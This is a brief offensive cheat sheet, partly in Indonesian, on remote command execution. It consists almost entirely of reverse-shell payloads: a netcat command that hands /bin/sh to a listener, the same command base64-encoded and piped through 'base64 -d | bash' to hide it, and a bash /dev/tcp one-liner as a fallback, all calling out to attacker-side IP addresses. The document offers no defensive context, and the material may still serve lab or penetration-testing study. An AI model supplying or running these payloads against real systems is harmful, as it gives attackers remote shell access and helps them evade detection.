# Remote Command Execution
## RCE Via Base64 
Payload `nc -e /bin/sh 10.0.0.1 1234`
```
echo "nc -e /bin/sh 192.168.56.107 1234" | base64
bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjU2LjEwNyAxMjM0Cg==
```

Untuk Proses RCE kita gunakan perintah berikut :
```
echo "bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjU2LjEwNyAxMjM0Cg==" | base64 -d | bash
```

Kalau gak bisa coba pakai payload lain, misalnya `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

```

```